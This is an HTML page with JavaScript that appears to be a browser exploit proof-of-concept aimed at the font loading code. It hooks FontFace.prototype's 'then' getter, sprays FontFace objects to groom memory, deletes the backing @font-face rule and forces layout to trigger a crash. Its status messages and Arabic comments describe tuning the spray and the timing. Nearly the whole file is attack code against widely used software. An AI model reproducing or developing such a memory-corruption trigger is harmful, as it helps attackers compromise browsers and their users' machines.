<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color:blue; font-family:monospace;">Status: Waiting...</div>
    <script>
        const debug = document.getElementById('debug');
        debug.innerText = "Status: Script Started.";

        window.onload = () => {
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug.innerText = "Status: HOOK TRIGGERED. Spraying memory...";
                        
                        // هنا التغيير: تقليل العدد واستخدام setTimeout لمنع الانفجار الفوري
                        setTimeout(() => {
                            for(let i=0; i<20; i++) { // خفضنا العدد إلى 20 بدلاً من 500
                                new FontFace('y'+i, 'local(Helvetica)');
                            }
                            
                            document.getElementById('s').sheet.deleteRule(0);
                            document.body.offsetTop;
                            
                            debug.innerText = "Status: Grooming complete. Watch for crash.";
                        }, 10); // 10ms تأخير كافٍ جداً للمتصفح ليحافظ على استقراره
                        
                    }
                    return undefined;
                }
            });

            debug.innerText = "Status: Loading...";
            document.fonts.load('1em x', 'AB').catch((e) => {
                debug.innerText = "Status: Finished with error: " + e.message;
            });
        };
    </script>
</body>
</html>
